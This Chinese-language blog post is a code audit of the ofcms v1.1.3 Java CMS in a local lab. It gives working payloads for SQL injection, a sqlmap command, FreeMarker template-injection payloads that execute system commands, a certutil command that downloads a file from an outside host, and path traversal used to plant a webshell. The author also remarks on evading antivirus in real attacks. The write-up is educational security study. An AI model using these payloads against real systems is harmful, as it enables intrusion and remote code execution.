# Java代码审计(四)-ofcms v1.1.3

**Funsiooo** 

2022-10-21 (Updated: 2022-10-26) 

 [Java代码审计](https://funsiooo.github.io/tags/Java代码审计/)

## 一、前言

该文章结合了之前审计时学习到的知识点，参考已有的文章，虽然该源码初步学习审计起来并不算困难，但距离独自审计还有一段距离，该 CMS 作为入门审计项目，对新手还算比较友好。当然该 CMS 还有其它漏洞点还没有进行审计学习，后续有时间再补充。

## 二、环境搭建

1、[导入源码](https://github.com/Funsiooo/Vuln_Bulid)，重新加载项目，源码地址：

![image-20221019230013447](https://funsiooo.github.io/images/Java/ofcms/image-20221019230013447.png)

配置 Tomcat 环境

![image-20221019230108972](https://funsiooo.github.io/images/Java/ofcms/image-20221019230108972.png)
![image-20221019230232755](https://funsiooo.github.io/images/Java/ofcms/image-20221019230232755.png)
![image-20221019230249450](https://funsiooo.github.io/images/Java/ofcms/image-20221019230249450.png)
![image-20221019230312244](https://funsiooo.github.io/images/Java/ofcms/image-20221019230312244.png)

修改数据库连接环境 `ofcms\ofcms-admin\src\main\resources\dev\conf\db-config.properties`

![image-20221019230547219](https://funsiooo.github.io/images/Java/ofcms/image-20221019230547219.png)

`path` 必须修改为系统可访问的路径，由于我自己环境为虚拟机，只有C盘，所以出现报错，若在真实环境下带d盘则不用理会

![image-20221019230724781](https://funsiooo.github.io/images/Java/ofcms/image-20221019230724781.png)
![image-20221019230853811](https://funsiooo.github.io/images/Java/ofcms/image-20221019230853811.png)

运行启动环境，点击右上角运行符号即可

![image-20221019231020331](https://funsiooo.github.io/images/Java/ofcms/image-20221019231020331.png)

运行成功后会自动弹出安装界面

![image-20221019231045182](https://funsiooo.github.io/images/Java/ofcms/image-20221019231045182.png)

点击下一步会出现报错，需要将访问地址改为 `http://本地IP:端口/项目路径`

![image-20221019231159805](https://funsiooo.github.io/images/Java/ofcms/image-20221019231159805.png)
![image-20221019231216862](https://funsiooo.github.io/images/Java/ofcms/image-20221019231216862.png)

这里的数据库环境依旧使用phpstudy

![image-20221019231304504](https://funsiooo.github.io/images/Java/ofcms/image-20221019231304504.png)

输入数据库密码进入下一步，需要创建一个空的，名为 `ofcms` 的数据库

![image-20221019231707919](https://funsiooo.github.io/images/Java/ofcms/image-20221019231707919.png)
![image-20221019231757207](https://funsiooo.github.io/images/Java/ofcms/image-20221019231757207.png)
![image-20221019231916420](https://funsiooo.github.io/images/Java/ofcms/image-20221019231916420.png)

接下来就系重点了，就是这个无限重装bug搞了我很久，因为如果按照提示重启web容器（idea run），依然会进入安装界面

![image-20221019232009809](https://funsiooo.github.io/images/Java/ofcms/image-20221019232009809.png)

这里需要修改数据库连接配置文件名，将 `db-config` 改为 `db`,之前因为连接数据库的 IP 地址填为本地 IP 地址 `192.x.x.x`，这样修改 `db-config` 为 `db` 则会报错，修改为 `localhost` 才不会报错

![image-20221019232111734](https://funsiooo.github.io/images/Java/ofcms/image-20221019232111734.png)
![image-20221019232345630](https://funsiooo.github.io/images/Java/ofcms/image-20221019232345630.png)

成功搭建

![image-20221019232502415](https://funsiooo.github.io/images/Java/ofcms/image-20221019232502415.png)
![image-20221019232519216](https://funsiooo.github.io/images/Java/ofcms/image-20221019232519216.png)

小结：这一部分的环境搭建坑点很多，主要还是卡在一些小细节。注意，解决重装bug记得要先把数据库连接地址改为 `localhost`（重要），然后安装一遍，让数据库生成相应的表格，然后将`db-config.properties` 改为 `db.properties`，然后重新运行即可。

## 三、代码审计

### 1、源码分析

开始审计前，大概了解程序框架，整个程序一共有五个模块组成，根据 `Readme` 可知其对应的作用

![image-20221020010225802](https://funsiooo.github.io/images/Java/ofcms/image-20221020010225802.png)
![image-20221020010344368](https://funsiooo.github.io/images/Java/ofcms/image-20221020010344368.png)

然后，我们查看 `pom.xml` ,`<dependencies>` 部分，即依赖。分析其程序使用了哪些框架，或应用版本是哪些，对我们后续审计有一定的作用。如下为 `ofcms v1.1.3` `pom.xml`文件，依赖如下，由信息可知程序信息有 `jfinal` 框架、`slf4j` 日志框架、`Apache` 中间件、`springframework` 框架、`Druid 1.0.5`、`fastjson 1.1.41`、`log4j 1.2.16`、`mysql 5.1.47`等信息，后续也可以对该程序进行已知漏洞的测试

![image-20221020010007868](https://funsiooo.github.io/images/Java/ofcms/image-20221020010007868.png)

通过查看源码得知，程序使用了 `tomcat` ，而代码对应存在 `web.xml` 配置文件，我们分析其配置文件，看有没有其它的信息。例子：通过 `web.xml` 得知 `druid` 路径为 `/admin/druid/`,若存在未授权则可以访问，但 `admin` 路径为后台路径，所以需要登录才能访问

![image-20221020010940740](https://funsiooo.github.io/images/Java/ofcms/image-20221020010940740.png)

尝试访问 `/admin/druid/*`，跳转至登录页面

![image-20221020011132305](https://funsiooo.github.io/images/Java/ofcms/image-20221020011132305.png)

登录后访问。这只是一个例子，通过配置文件找寻一些有用的信息

![image-20221020011211309](https://funsiooo.github.io/images/Java/ofcms/image-20221020011211309.png)

然后我们通过一下源码，大概了解程序结构，以及相应代码文件夹的源码作用是哪些，一般我们查看文件夹下的 `/src/java` 目录下的源码即可。`Controller` 源码对应 `resources`，我们可以通过 `Controller` 分析其请求状况，然后到 `resources` 中查看其具体代码。

![image-20221020012651194](https://funsiooo.github.io/images/Java/ofcms/image-20221020012651194.png)

最后，每个代码页面浏览一下，通过代码结构和注释等信息了解大概的结构。基本知识点请移步站内文章[《JAVA代码审计(三)-基础知识》](https://funsiooo.github.io/2022/10/02/JAVA代码审计(三)-基础知识)

### 2、漏洞审计

#### SQL注入

这里使用白盒测试，通过分析后测试漏洞点，`后台-》代码生成-》`,随便输入字符，报错

![image-20221020015034179](https://funsiooo.github.io/images/Java/ofcms/image-20221020015034179.png)

为了显示得更直观，这里利用 Burp 抓包

![image-20221020015121559](https://funsiooo.github.io/images/Java/ofcms/image-20221020015121559.png)

验证测试 payload：
`update+of_cms_link+set+link_name%3dupdatexml(1,concat(0x7e,(user())),0)+where+link_id+%3d+4`

![image-20221020000529612](https://funsiooo.github.io/images/Java/ofcms/image-20221020000529612.png)

简单复现，祭出神器 Sqlmap `python sqlmap.py -r ofcms.txt -p sql --level 3 --dbs`

![image-20221020000923745](https://funsiooo.github.io/images/Java/ofcms/image-20221020000923745.png)

漏洞分析，定位漏洞位置源码。通过 Burp 中发现 `referer 中system/generate`，源码中定位该代码文件

![image-20221020021417891](https://funsiooo.github.io/images/Java/ofcms/image-20221020021417891.png)
![image-20221020020122144](https://funsiooo.github.io/images/Java/ofcms/image-20221020020122144.png)

全局搜索，定位代码位置
`\ofcms\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemGenerateController.java`

![image-20221020020637848](https://funsiooo.github.io/images/Java/ofcms/image-20221020020637848.png)

其中通过分析代码，发现漏洞点参数 `sql`

![image-20221020020851984](https://funsiooo.github.io/images/Java/ofcms/image-20221020020851984.png)

跟进 `getPara()` 方法，查看具体返回方式， `Ctrl + 鼠标左键`，由下图代码可知，程序没有对 `sql` 参数进行过滤，`getPara()` 请求后，系统直接将返回请求的参数

![image-20221020021029645](https://funsiooo.github.io/images/Java/ofcms/image-20221020021029645.png)

若不知道漏洞点，进行漏洞点追踪定位代码。比如我们通过审计追踪代码，发现`/system/generate` 路径下 `sql` 参数没有进行过滤，可能存在注入漏洞

![image-20221020020851984](https://funsiooo.github.io/images/Java/ofcms/image-20221020020851984.png)
![image-20221020021928106](https://funsiooo.github.io/images/Java/ofcms/image-20221020021928106.png)

根据现有信息，我们知道，漏洞点参数为 `sql`，路径为 `/system/generate/`，向上追踪路径为 `/admin/system/generate`，综合所得，通过 Burp 代理抓包，点击功能点，查看哪个页面为 `/admin/system/generate` 且存在输入点参数 `sql`，则进行测试即可

![image-20221020022215661](https://funsiooo.github.io/images/Java/ofcms/image-20221020022215661.png)
![image-20221020022414193](https://funsiooo.github.io/images/Java/ofcms/image-20221020022414193.png)

#### SSTI服务器模板注入

由 pom.xml 中发现存在 FreeMarker 模板引擎的依赖，该模板存在模板注入,尝试进行复现

![image-20221021000447406](https://funsiooo.github.io/images/Java/ofcms/image-20221021000447406.png)

漏洞点为模板文件处

![image-20221021002005057](https://funsiooo.github.io/images/Java/ofcms/image-20221021002005057.png)

我们可以修改模板文件内容插入恶意语句，触发系统命令执行。如下插入恶意语句执行系统命令促使弹出计算器

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("calc") }
```

![image-20221021003322351](https://funsiooo.github.io/images/Java/ofcms/image-20221021003322351.png)

保存后，访问主页触发命令，因为编辑的模板为主页样式模板

![image-20221021002215557](https://funsiooo.github.io/images/Java/ofcms/image-20221021002215557.png)

通过 Burp 定位到漏洞代码，`/ofcms_admin_war/admin/cms/template` 路径下的 `file_content` 参数

![image-20221021002555604](https://funsiooo.github.io/images/Java/ofcms/image-20221021002555604.png)

对应控制处理方法为 `com.ofsoft.cms.admin.controller.cms.TemplateController 类中的save方法`，从下图可以看出来，其实代码有对 `fileContent` 内容进行替换，但没有进行过滤，replace() 的使用方法为 `字符串.replace(String oldChar, String newChar)`

![image-20221021002943097](https://funsiooo.github.io/images/Java/ofcms/image-20221021002943097.png)

我们跟进 `getRequest()`方法 `Ctrl + 鼠标左键`，查看具体返回,由下图可知，直接对返回 `request` 请求，没有任何过滤

![image-20221021005342147](https://funsiooo.github.io/images/Java/ofcms/image-20221021005342147.png)

漏洞原因为：`FreeMarker` 提供高级内置函数，导致攻击者可以构造语句去实现攻击，其中引擎模板中存在能够执行的类是主要能构造命令执行的原因，官方文档 `http://freemarker.foofun.cn/ref_builtins_expert.html`

![image-20221021012934815](https://funsiooo.github.io/images/Java/ofcms/image-20221021012934815.png)

由于我这里找不到具体的代码，所以就不显示了。贴出网上的payload如下

构造方法一：
`freemarker.template.utility` 中的 `Execute 类` ,利用new函数新建一个Execute类,传输我们要执行的命令作为参数，构造远程命令。

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```



构造方法二：
`freemarker.template.utility` 中的 `ObjectConstructor类`

```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```



构造方法三：
`freemarker.template.utility` 中的 `JythonRuntime类`

```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```



具体语句解析，原始：`<#assign word_wrapp = "com.acmee.freemarker.WordWrapperDirective"?new()>`，利用 `Execute` 类构造恶意语句 `<#assign xxx= "freemarker.template.utility.Execute"?new()>${xxx("calc")}`，其中xxx为相同的字符，亲测数字不能触发语句，`freemarker.template.utility.Execute` 为 freemarker 模板引擎的

![image-20221021014155077](https://funsiooo.github.io/images/Java/ofcms/image-20221021014155077.png)
![image-20221021014135817](https://funsiooo.github.io/images/Java/ofcms/image-20221021014135817.png)

尝试利用 `certutil.exe` 远程下载文件，远程服务器文件内容只是123456，但由于使用了 `certutil` 命令，系统会拦截

```
<#assign ex="freemarker.template.utility.Execute"?new()> 
  ${ ex("certutil -urlcache -split -f http://x.x.x.x:2333/ssti.txt ssti.exe") }
```

![image-20221021012311523](https://funsiooo.github.io/images/Java/ofcms/image-20221021012311523.png)
![image-20221021012141523](https://funsiooo.github.io/images/Java/ofcms/image-20221021012141523.png)

把防护关了以后，会下载到 tomcat 的目录下。所以实战中得考虑，绕过主机防护设备，马儿得免杀

![image-20221021012506146](https://funsiooo.github.io/images/Java/ofcms/image-20221021012506146.png)

#### 任意文件写入

漏洞点同样在 `SSTI` 漏洞位置中的 `save` 函数中

![image-20221021020833483](https://funsiooo.github.io/images/Java/ofcms/image-20221021020833483.png)

首先从前台获取 `file_name、file_content` 两个参数，该函数的 `file_name` 是直接和 `pathfile` 目录拼接，导致可以路径穿越，文件可以写到任意位置

![image-20221021021122226](https://funsiooo.github.io/images/Java/ofcms/image-20221021021122226.png)
![image-20221021021309015](https://funsiooo.github.io/images/Java/ofcms/image-20221021021309015.png)

获取接口

![image-20221021022029123](https://funsiooo.github.io/images/Java/ofcms/image-20221021022029123.png)

构造查询

![image-20221021022429063](https://funsiooo.github.io/images/Java/ofcms/image-20221021022429063.png)

上传 `Webshell` 至 `static` 目录

![image-20221021033127359](https://funsiooo.github.io/images/Java/ofcms/image-20221021033127359.png)
![image-20221021033310849](https://funsiooo.github.io/images/Java/ofcms/image-20221021033310849.png)

#### 任意文件上传

在 `ComnController.java` 和 `UeditorAction.java` 文件下存在多个上传接口，其中 `upload`、`editUploadImage`、`uploadImage`、`uploadFile`、`uploadVideo` 和 `uploadScrawl` 函数均使用了，这里环境接口有问题，导致无法上传图片，所以就无法复现

![image-20221021034750952](https://funsiooo.github.io/images/Java/ofcms/image-20221021034750952.png)
![image-20221021034529451](https://funsiooo.github.io/images/Java/ofcms/image-20221021034529451.png)

跟进后没有发现过滤，由于参考文章中能跟进到 `MultipartRequest` 函数中去，这里由于笔者水平有限，加上环境也许有点问题，导致无法跟进到最后，后续有机会再学习一下

![image-20221021040448644](https://funsiooo.github.io/images/Java/ofcms/image-20221021040448644.png)

## 四、参考文章

```
https://forum.butian.net/share/1229
https://blog.csdn.net/Alexz__/article/details/116229266
https://www.secpulse.com/archives/185233.html
https://blog.csdn.net/YouthBelief/article/details/122978328
https://www.cnblogs.com/Eleven-Liu/p/12747908.html
```